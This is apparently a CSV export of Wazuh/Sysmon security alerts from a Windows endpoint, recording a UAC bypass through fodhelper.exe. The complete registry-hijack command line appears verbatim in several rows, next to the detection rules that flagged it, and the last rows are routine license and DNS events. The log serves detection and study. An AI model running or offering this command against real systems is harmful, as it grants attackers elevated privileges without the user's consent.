2025-12-29T10:32:31.604Z,Endpoint3-Win,1,92004,Powershell process spawned Windows command shell instance,4,T1059.003,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'originalFileName': 'Cmd.Exe', 'image': 'C:\\\\Windows\\\\System32\\\\cmd.exe', 'product': 'Microsoft® Windows® Operating System', 'parentProcessGuid': '{411eefe4-ab3e-6951-cb0d-000000001000}', 'description': 'Windows Command Processor', 'logonGuid': '{411eefe4-28dc-6951-f5d2-0e0000000000}', 'parentCommandLine': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'processGuid': '{411eefe4-58bd-6952-a618-000000001000}', 'logonId': '0xed2f5', 'parentProcessId': '5948', 'processId': '5152', 'currentDirectory': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\', 'utcTime': '2025-12-29 10:32:29.554', 'hashes': 'SHA1=583BAC245F14E4E07E7508692C5D8B97F9EB9E6D,MD5=6D109A3A00F210C1AB89C3B08399ED48,SHA256=64AFC6DB3AAD1289533662E2D79E27DD55C7DCDB8CD918B08E145AD82AD5ACB4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9', 'parentImage': 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'ruleName': 'technique_id=T1059.003,technique_name=Windows Command Shell', 'company': 'Microsoft Corporation', 'commandLine': '\\""cmd.exe\\"" /c reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\""C:\\\\Windows\\\\System32\\\\cmd.exe\\"" /f &amp; reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\""DelegateExecute\\"" /f &amp; fodhelper.exe', 'integrityLevel': 'High', 'fileVersion': '10.0.26100.7309 (WinBuild.160101.0800)', 'user': 'WINDOWSEND-C792\\\\ayoub', 'terminalSessionId': '1', 'parentUser': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '1', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2025-12-29 10:32:29.554\r\nProcessGuid: {411eefe4-58bd-6952-a618-000000001000}\r\nProcessId: 5152\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.7309 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: ""cmd.exe"" /c reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d ""C:\\Windows\\System32\\cmd.exe"" /f & reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v ""DelegateExecute"" /f & fodhelper.exe\r\nCurrentDirectory: C:\\Users\\ayoub\\AppData\\Local\\Temp\\\r\nUser: WINDOWSEND-C792\\ayoub\r\nLogonGuid: {411eefe4-28dc-6951-f5d2-0e0000000000}\r\nLogonId: 0xED2F5\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=583BAC245F14E4E07E7508692C5D8B97F9EB9E6D,MD5=6D109A3A00F210C1AB89C3B08399ED48,SHA256=64AFC6DB3AAD1289533662E2D79E27DD55C7DCDB8CD918B08E145AD82AD5ACB4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9\r\nParentProcessGuid: {411eefe4-ab3e-6951-cb0d-000000001000}\r\nParentProcessId: 5948\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentUser: WINDOWSEND-C792\\ayoub""', 'version': '5', 'systemTime': '2025-12-29T10:32:29.5582315Z', 'eventRecordID': '18744', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 4, 'mail': False, 'level': 4, 'description': 'Powershell process spawned Windows command shell instance', 'groups': ['sysmon', 'sysmon_eid1_detections', 'windows'], 'mitre': {'technique': ['Windows Command Shell'], 'id': ['T1059.003'], 'tactic': ['Execution']}, 'id': '92004'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:32:31.604Z', 'location': 'EventChannel', 'id': '1767004351.7468860', 'timestamp': '2025-12-29T11:32:31.604+0100'}",medium,"\""cmd.exe\"" /c reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \""C:\\Windows\\System32\\cmd.exe\"" /f &amp; reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \""DelegateExecute\"" /f &amp; fodhelper.exe"
2025-12-29T10:32:31.616Z,Endpoint3-Win,1,92041,Value added to registry key has Base64-like pattern,10,T1027;T1112,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'originalFileName': 'reg.exe', 'image': 'C:\\\\Windows\\\\System32\\\\reg.exe', 'product': 'Microsoft® Windows® Operating System', 'parentProcessGuid': '{411eefe4-58bd-6952-a618-000000001000}', 'description': 'Registry Console Tool', 'logonGuid': '{411eefe4-28dc-6951-f5d2-0e0000000000}', 'parentCommandLine': '\\""cmd.exe\\"" /c reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\""C:\\\\Windows\\\\System32\\\\cmd.exe\\"" /f &amp; reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\""DelegateExecute\\"" /f &amp; fodhelper.exe', 'processGuid': '{411eefe4-58bd-6952-a818-000000001000}', 'logonId': '0xed2f5', 'parentProcessId': '5152', 'processId': '11388', 'currentDirectory': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\', 'utcTime': '2025-12-29 10:32:29.640', 'hashes': 'SHA1=3922B8843F27EEC9BED40F54C888D683340E61F8,MD5=F6E3559DDDDCCC843A12CFD50178C554,SHA256=EF37663B44AC66920C6F33694DEEA01ACB78AE3F3012884819373FA04C3EB5F0,IMPHASH=2DC6AE94704E0DBEAFC5A2BB00BD87F0', 'parentImage': 'C:\\\\Windows\\\\System32\\\\cmd.exe', 'ruleName': 'technique_id=T1012,technique_name=Query Registry', 'company': 'Microsoft Corporation', 'commandLine': 'reg.exe  add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\""C:\\\\Windows\\\\System32\\\\cmd.exe\\"" /f', 'integrityLevel': 'High', 'fileVersion': '10.0.26100.5074 (WinBuild.160101.0800)', 'user': 'WINDOWSEND-C792\\\\ayoub', 'terminalSessionId': '1', 'parentUser': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '1', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Process Create:\r\nRuleName: technique_id=T1012,technique_name=Query Registry\r\nUtcTime: 2025-12-29 10:32:29.640\r\nProcessGuid: {411eefe4-58bd-6952-a818-000000001000}\r\nProcessId: 11388\r\nImage: C:\\Windows\\System32\\reg.exe\r\nFileVersion: 10.0.26100.5074 (WinBuild.160101.0800)\r\nDescription: Registry Console Tool\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: reg.exe\r\nCommandLine: reg.exe  add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d ""C:\\Windows\\System32\\cmd.exe"" /f \r\nCurrentDirectory: C:\\Users\\ayoub\\AppData\\Local\\Temp\\\r\nUser: WINDOWSEND-C792\\ayoub\r\nLogonGuid: {411eefe4-28dc-6951-f5d2-0e0000000000}\r\nLogonId: 0xED2F5\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=3922B8843F27EEC9BED40F54C888D683340E61F8,MD5=F6E3559DDDDCCC843A12CFD50178C554,SHA256=EF37663B44AC66920C6F33694DEEA01ACB78AE3F3012884819373FA04C3EB5F0,IMPHASH=2DC6AE94704E0DBEAFC5A2BB00BD87F0\r\nParentProcessGuid: {411eefe4-58bd-6952-a618-000000001000}\r\nParentProcessId: 5152\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: ""cmd.exe"" /c reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d ""C:\\Windows\\System32\\cmd.exe"" /f & reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v ""DelegateExecute"" /f & fodhelper.exe\r\nParentUser: WINDOWSEND-C792\\ayoub""', 'version': '5', 'systemTime': '2025-12-29T10:32:29.6450183Z', 'eventRecordID': '18747', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 4, 'mail': False, 'level': 10, 'description': 'Value added to registry key has Base64-like pattern', 'groups': ['sysmon', 'sysmon_eid1_detections', 'windows'], 'mitre': {'technique': ['Obfuscated Files or Information', 'Modify Registry'], 'id': ['T1027', 'T1112'], 'tactic': ['Defense Evasion']}, 'id': '92041'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:32:31.616Z', 'location': 'EventChannel', 'id': '1767004351.7476067', 'timestamp': '2025-12-29T11:32:31.616+0100'}",high,"reg.exe  add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \""C:\\Windows\\System32\\cmd.exe\"" /f"
2025-12-29T10:32:31.620Z,Endpoint3-Win,1,92305,Command interpreter added to registry key associated to UAC bypass by auto-elevated processes,12,T1548.002;T1112,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'image': 'C:\\\\WINDOWS\\\\system32\\\\reg.exe', 'targetObject': 'HKU\\\\S-1-5-21-1194248728-2016982980-2923753283-1001_Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\(Default)', 'processGuid': '{411eefe4-58bd-6952-a818-000000001000}', 'processId': '11388', 'utcTime': '2025-12-29 10:32:29.665', 'details': 'C:\\\\Windows\\\\System32\\\\cmd.exe', 'eventType': 'SetValue', 'user': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '13', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2025-12-29 10:32:29.665\r\nProcessGuid: {411eefe4-58bd-6952-a818-000000001000}\r\nProcessId: 11388\r\nImage: C:\\WINDOWS\\system32\\reg.exe\r\nTargetObject: HKU\\S-1-5-21-1194248728-2016982980-2923753283-1001_Classes\\ms-settings\\shell\\open\\command\\(Default)\r\nDetails: C:\\Windows\\System32\\cmd.exe\r\nUser: WINDOWSEND-C792\\ayoub""', 'version': '2', 'systemTime': '2025-12-29T10:32:29.6670348Z', 'eventRecordID': '18748', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '13', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 1, 'mail': True, 'level': 12, 'description': 'Command interpreter added to registry key associated to UAC bypass by auto-elevated processes', 'groups': ['sysmon', 'sysmon_eid13_detections', 'windows'], 'mitre': {'technique': ['Bypass User Account Control', 'Modify Registry'], 'id': ['T1548.002', 'T1112'], 'tactic': ['Privilege Escalation', 'Defense Evasion']}, 'id': '92305'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:32:31.620Z', 'location': 'EventChannel', 'id': '1767004351.7483307', 'timestamp': '2025-12-29T11:32:31.620+0100'}",critical,
2025-12-29T10:32:31.627Z,Endpoint3-Win,1,92304,Modified registry key associated to UAC bypass by auto-elevated processes,6,T1548.002;T1112,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'image': 'C:\\\\WINDOWS\\\\system32\\\\reg.exe', 'targetObject': 'HKU\\\\S-1-5-21-1194248728-2016982980-2923753283-1001_Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\DelegateExecute', 'processGuid': '{411eefe4-58bd-6952-a918-000000001000}', 'processId': '12944', 'utcTime': '2025-12-29 10:32:29.704', 'details': '(Empty)', 'eventType': 'SetValue', 'user': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '13', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2025-12-29 10:32:29.704\r\nProcessGuid: {411eefe4-58bd-6952-a918-000000001000}\r\nProcessId: 12944\r\nImage: C:\\WINDOWS\\system32\\reg.exe\r\nTargetObject: HKU\\S-1-5-21-1194248728-2016982980-2923753283-1001_Classes\\ms-settings\\shell\\open\\command\\DelegateExecute\r\nDetails: (Empty)\r\nUser: WINDOWSEND-C792\\ayoub""', 'version': '2', 'systemTime': '2025-12-29T10:32:29.7051112Z', 'eventRecordID': '18750', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '13', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 1, 'mail': False, 'level': 6, 'description': 'Modified registry key associated to UAC bypass by auto-elevated processes', 'groups': ['sysmon', 'sysmon_eid13_detections', 'windows'], 'mitre': {'technique': ['Bypass User Account Control', 'Modify Registry'], 'id': ['T1548.002', 'T1112'], 'tactic': ['Privilege Escalation', 'Defense Evasion']}, 'id': '92304'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:32:31.627Z', 'location': 'EventChannel', 'id': '1767004351.7486282', 'timestamp': '2025-12-29T11:32:31.627+0100'}",medium,
2025-12-29T10:32:31.632Z,Endpoint3-Win,1,92055,Known auto-elevated utility FodHelper.EXE may have been used to bypass UAC,12,T1548.002,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'originalFileName': 'FodHelper.EXE', 'image': 'C:\\\\Windows\\\\System32\\\\fodhelper.exe', 'product': 'Microsoft® Windows® Operating System', 'parentProcessGuid': '{411eefe4-58bd-6952-a618-000000001000}', 'description': 'Features On Demand Helper', 'logonGuid': '{411eefe4-28dc-6951-f5d2-0e0000000000}', 'parentCommandLine': '\\""cmd.exe\\"" /c reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\""C:\\\\Windows\\\\System32\\\\cmd.exe\\"" /f &amp; reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\""DelegateExecute\\"" /f &amp; fodhelper.exe', 'processGuid': '{411eefe4-58bd-6952-aa18-000000001000}', 'logonId': '0xed2f5', 'parentProcessId': '5152', 'processId': '11172', 'currentDirectory': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\', 'utcTime': '2025-12-29 10:32:29.743', 'hashes': 'SHA1=7CAC80110A5F89AFA0E5B8A814ADFEA766735389,MD5=1D5D85D9F34ED7536F791E557C627DCD,SHA256=EC9B0D09B56F46F0308D594CD9D595EB492A67ED0024A9B7A13FA995966932F7,IMPHASH=DBF7EE2D74DF21B22A4262589616FD47', 'parentImage': 'C:\\\\Windows\\\\System32\\\\cmd.exe', 'ruleName': 'technique_id=T1548.002,technique_name=Bypass User Access Control', 'company': 'Microsoft Corporation', 'commandLine': 'fodhelper.exe', 'integrityLevel': 'High', 'fileVersion': '10.0.26100.1150 (WinBuild.160101.0800)', 'user': 'WINDOWSEND-C792\\\\ayoub', 'terminalSessionId': '1', 'parentUser': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '1', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Process Create:\r\nRuleName: technique_id=T1548.002,technique_name=Bypass User Access Control\r\nUtcTime: 2025-12-29 10:32:29.743\r\nProcessGuid: {411eefe4-58bd-6952-aa18-000000001000}\r\nProcessId: 11172\r\nImage: C:\\Windows\\System32\\fodhelper.exe\r\nFileVersion: 10.0.26100.1150 (WinBuild.160101.0800)\r\nDescription: Features On Demand Helper\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: FodHelper.EXE\r\nCommandLine: fodhelper.exe\r\nCurrentDirectory: C:\\Users\\ayoub\\AppData\\Local\\Temp\\\r\nUser: WINDOWSEND-C792\\ayoub\r\nLogonGuid: {411eefe4-28dc-6951-f5d2-0e0000000000}\r\nLogonId: 0xED2F5\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=7CAC80110A5F89AFA0E5B8A814ADFEA766735389,MD5=1D5D85D9F34ED7536F791E557C627DCD,SHA256=EC9B0D09B56F46F0308D594CD9D595EB492A67ED0024A9B7A13FA995966932F7,IMPHASH=DBF7EE2D74DF21B22A4262589616FD47\r\nParentProcessGuid: {411eefe4-58bd-6952-a618-000000001000}\r\nParentProcessId: 5152\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: ""cmd.exe"" /c reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d ""C:\\Windows\\System32\\cmd.exe"" /f & reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v ""DelegateExecute"" /f & fodhelper.exe\r\nParentUser: WINDOWSEND-C792\\ayoub""', 'version': '5', 'systemTime': '2025-12-29T10:32:29.7521113Z', 'eventRecordID': '18751', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 1, 'mail': True, 'level': 12, 'description': 'Known auto-elevated utility FodHelper.EXE may have been used to bypass UAC', 'groups': ['sysmon', 'sysmon_eid1_detections', 'windows'], 'mitre': {'technique': ['Bypass User Account Control'], 'id': ['T1548.002'], 'tactic': ['Privilege Escalation', 'Defense Evasion']}, 'id': '92055'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:32:31.632Z', 'location': 'EventChannel', 'id': '1767004351.7489159', 'timestamp': '2025-12-29T11:32:31.632+0100'}",critical,fodhelper.exe
2025-12-29T10:32:32.965Z,Endpoint3-Win,1,92046,Possible use of fodhelper.exe used to bypass UAC and execute of malicious software,12,T1548.002,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'originalFileName': 'Cmd.Exe', 'image': 'C:\\\\Windows\\\\System32\\\\cmd.exe', 'product': 'Microsoft® Windows® Operating System', 'parentProcessGuid': '{411eefe4-58bd-6952-aa18-000000001000}', 'description': 'Windows Command Processor', 'logonGuid': '{411eefe4-28dc-6951-f5d2-0e0000000000}', 'parentCommandLine': 'fodhelper.exe', 'processGuid': '{411eefe4-58be-6952-ab18-000000001000}', 'logonId': '0xed2f5', 'parentProcessId': '11172', 'processId': '12924', 'currentDirectory': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\', 'utcTime': '2025-12-29 10:32:30.798', 'hashes': 'SHA1=583BAC245F14E4E07E7508692C5D8B97F9EB9E6D,MD5=6D109A3A00F210C1AB89C3B08399ED48,SHA256=64AFC6DB3AAD1289533662E2D79E27DD55C7DCDB8CD918B08E145AD82AD5ACB4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9', 'parentImage': 'C:\\\\Windows\\\\System32\\\\fodhelper.exe', 'ruleName': 'technique_id=T1548.002,technique_name=Bypass User Access Control', 'company': 'Microsoft Corporation', 'commandLine': '\\""C:\\\\Windows\\\\System32\\\\cmd.exe\\""', 'integrityLevel': 'High', 'fileVersion': '10.0.26100.7309 (WinBuild.160101.0800)', 'user': 'WINDOWSEND-C792\\\\ayoub', 'terminalSessionId': '1', 'parentUser': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '1', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Process Create:\r\nRuleName: technique_id=T1548.002,technique_name=Bypass User Access Control\r\nUtcTime: 2025-12-29 10:32:30.798\r\nProcessGuid: {411eefe4-58be-6952-ab18-000000001000}\r\nProcessId: 12924\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.7309 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: ""C:\\Windows\\System32\\cmd.exe"" \r\nCurrentDirectory: C:\\Users\\ayoub\\AppData\\Local\\Temp\\\r\nUser: WINDOWSEND-C792\\ayoub\r\nLogonGuid: {411eefe4-28dc-6951-f5d2-0e0000000000}\r\nLogonId: 0xED2F5\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=583BAC245F14E4E07E7508692C5D8B97F9EB9E6D,MD5=6D109A3A00F210C1AB89C3B08399ED48,SHA256=64AFC6DB3AAD1289533662E2D79E27DD55C7DCDB8CD918B08E145AD82AD5ACB4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9\r\nParentProcessGuid: {411eefe4-58bd-6952-aa18-000000001000}\r\nParentProcessId: 11172\r\nParentImage: C:\\Windows\\System32\\fodhelper.exe\r\nParentCommandLine: fodhelper.exe\r\nParentUser: WINDOWSEND-C792\\ayoub""', 'version': '5', 'systemTime': '2025-12-29T10:32:30.8090743Z', 'eventRecordID': '18754', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 1, 'mail': True, 'level': 12, 'description': 'Possible use of fodhelper.exe used to bypass UAC and execute of malicious software', 'groups': ['sysmon', 'sysmon_eid1_detections', 'windows'], 'mitre': {'technique': ['Bypass User Account Control'], 'id': ['T1548.002'], 'tactic': ['Privilege Escalation', 'Defense Evasion']}, 'id': '92046'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:32:32.965Z', 'location': 'EventChannel', 'id': '1767004352.7496131', 'timestamp': '2025-12-29T11:32:32.965+0100'}",critical,"\""C:\\Windows\\System32\\cmd.exe\"""
2025-12-29T10:38:00.745Z,Endpoint3-Win,1,60646,License activation (slui.exe) failed.,5,,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'data': 'hr=0x803F7001, RuleId=31e71c49-8da7-4a2f-ad92-45d98a1c79ba;Action=AutoActivate;AppId=55c92734-d682-4d71-983e-d6ec3f16059f;SkuId=4de7cb65-cdf1-4de9-8ae8-e3cce27b9f2c;NotificationInterval=1440;Trigger=NetworkAvailable'}, 'system': {'eventID': '8198', 'eventSourceName': 'Software Protection Platform Service', 'keywords': '0x80000000000000', 'providerGuid': '{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}', 'level': '2', 'channel': 'Application', 'opcode': '0', 'message': '""License Activation (slui.exe) failed with the following error code:\r\nhr=0x803F7001\r\nCommand-line arguments:\r\nRuleId=31e71c49-8da7-4a2f-ad92-45d98a1c79ba;Action=AutoActivate;AppId=55c92734-d682-4d71-983e-d6ec3f16059f;SkuId=4de7cb65-cdf1-4de9-8ae8-e3cce27b9f2c;NotificationInterval=1440;Trigger=NetworkAvailable""', 'version': '0', 'systemTime': '2025-12-29T10:37:56.4804742Z', 'eventRecordID': '1120', 'threadID': '0', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '0', 'processID': '5108', 'severityValue': 'ERROR', 'providerName': 'Microsoft-Windows-Security-SPP'}}}, 'rule': {'firedtimes': 2, 'mail': False, 'level': 5, 'description': 'License activation (slui.exe) failed.', 'groups': ['windows', 'windows_application'], 'id': '60646'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:38:00.745Z', 'location': 'EventChannel', 'id': '1767004680.7502217', 'timestamp': '2025-12-29T11:38:00.745+0100'}",medium,
2025-12-29T10:38:00.761Z,Endpoint3-Win,1,60646,License activation (slui.exe) failed.,5,,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'data': 'hr=0x803F7001, RuleId=31e71c49-8da7-4a2f-ad92-45d98a1c79ba;Action=AutoActivate;AppId=55c92734-d682-4d71-983e-d6ec3f16059f;SkuId=4de7cb65-cdf1-4de9-8ae8-e3cce27b9f2c;NotificationInterval=1440;Trigger=NetworkAvailable'}, 'system': {'eventID': '8198', 'eventSourceName': 'Software Protection Platform Service', 'keywords': '0x80000000000000', 'providerGuid': '{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}', 'level': '2', 'channel': 'Application', 'opcode': '0', 'message': '""License Activation (slui.exe) failed with the following error code:\r\nhr=0x803F7001\r\nCommand-line arguments:\r\nRuleId=31e71c49-8da7-4a2f-ad92-45d98a1c79ba;Action=AutoActivate;AppId=55c92734-d682-4d71-983e-d6ec3f16059f;SkuId=4de7cb65-cdf1-4de9-8ae8-e3cce27b9f2c;NotificationInterval=1440;Trigger=NetworkAvailable""', 'version': '0', 'systemTime': '2025-12-29T10:37:56.6444714Z', 'eventRecordID': '1122', 'threadID': '0', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '0', 'processID': '8336', 'severityValue': 'ERROR', 'providerName': 'Microsoft-Windows-Security-SPP'}}}, 'rule': {'firedtimes': 3, 'mail': False, 'level': 5, 'description': 'License activation (slui.exe) failed.', 'groups': ['windows', 'windows_application'], 'id': '60646'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:38:00.761Z', 'location': 'EventChannel', 'id': '1767004680.7504622', 'timestamp': '2025-12-29T11:38:00.761+0100'}",medium,
2025-12-29T10:38:02.049Z,Endpoint3-Win,1,61109,Name resolution for the name wpad timed out,5,,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'addressLength': '128', 'clientPID': '9820', 'address': '02000000C0A86402000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', 'queryName': 'wpad'}, 'system': {'eventID': '1014', 'keywords': '0x4000000010000000', 'providerGuid': '{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}', 'level': '3', 'channel': 'System', 'opcode': '0', 'message': '""Name resolution for the name wpad timed out after none of the configured DNS servers responded. Client PID 9820.""', 'version': '1', 'systemTime': '2025-12-29T10:32:53.6841951Z', 'eventRecordID': '2397', 'threadID': '12388', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1014', 'processID': '2060', 'severityValue': 'WARNING', 'providerName': 'Microsoft-Windows-DNS-Client'}}}, 'rule': {'firedtimes': 2, 'mail': False, 'level': 5, 'description': 'Name resolution for the name wpad timed out', 'groups': ['windows', 'windows_system'], 'id': '61109'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:38:02.049Z', 'location': 'EventChannel', 'id': '1767004682.7507027', 'timestamp': '2025-12-29T11:38:02.049+0100'}",medium,
